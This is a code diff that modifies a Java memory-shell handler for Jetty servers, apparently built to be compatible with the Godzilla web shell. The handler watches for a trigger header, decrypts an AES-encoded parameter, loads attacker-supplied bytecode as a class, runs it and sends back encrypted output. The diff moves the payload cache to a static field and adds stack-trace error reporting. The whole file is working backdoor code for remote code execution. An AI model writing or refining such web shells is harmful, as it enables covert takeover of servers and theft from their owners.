@@ -3,17 +3,19 @@ package com.reajason.javaweb.memshell.shelltool.godzilla;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.ByteArrayOutputStream;
+import java.io.PrintStream;
 import java.io.PrintWriter;
 
 /**
  * @author ReaJason
  */
 public class GodzillaJettyHandler extends ClassLoader {
-    public static String key;
-    public static String pass;
-    public static String md5;
-    public static String headerName;
-    public static String headerValue;
+    private static String key;
+    private static String pass;
+    private static String md5;
+    private static String headerName;
+    private static String headerValue;
+    private static Class<?> payload;
 
     public GodzillaJettyHandler() {
     }
@@ -47,27 +49,30 @@ public class GodzillaJettyHandler extends ClassLoader {
         try {
             String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
             if (value != null && value.contains(headerValue)) {
-                String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
-                byte[] data = base64Decode(parameter);
-                data = this.x(data, false);
-                Object session = request.getClass().getMethod("getSession").invoke(request);
-                Object cache = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
-                if (cache == null) {
-                    session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, (new GodzillaJettyHandler(Thread.currentThread().getContextClassLoader())).defineClass(data, 0, data.length));
-                } else {
-                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                    Object f = ((Class<?>) cache).newInstance();
-                    f.equals(arrOut);
-                    f.equals(request);
-                    f.equals(data);
-                    f.toString();
-                    PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
-                    writer.write(md5.substring(0, 16));
-                    writer.write(base64Encode(this.x(arrOut.toByteArray(), true)));
-                    writer.write(md5.substring(16));
-                }
-                if (baseRequest != null) {
-                    baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
+                PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
+                try {
+                    String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
+                    byte[] data = base64Decode(parameter);
+                    data = this.x(data, false);
+                    if (payload == null) {
+                        payload = new GodzillaJettyHandler(Thread.currentThread().getContextClassLoader()).defineClass(data, 0, data.length);
+                    } else {
+                        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+                        Object f = payload.newInstance();
+                        f.equals(arrOut);
+                        f.equals(request);
+                        f.equals(data);
+                        f.toString();
+                        writer.write(md5.substring(0, 16));
+                        writer.write(base64Encode(this.x(arrOut.toByteArray(), true)));
+                        writer.write(md5.substring(16));
+                    }
+                    if (baseRequest != null) {
+                        baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
+                    }
+                } catch (Throwable e) {
+                    e.printStackTrace();
+                    writer.write(getErrorMessage(e));
                 }
                 return true;
             }
@@ -103,5 +108,20 @@ public class GodzillaJettyHandler extends ClassLoader {
         Cipher c = Cipher.getInstance("AES");
         c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
         return c.doFinal(s);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 }
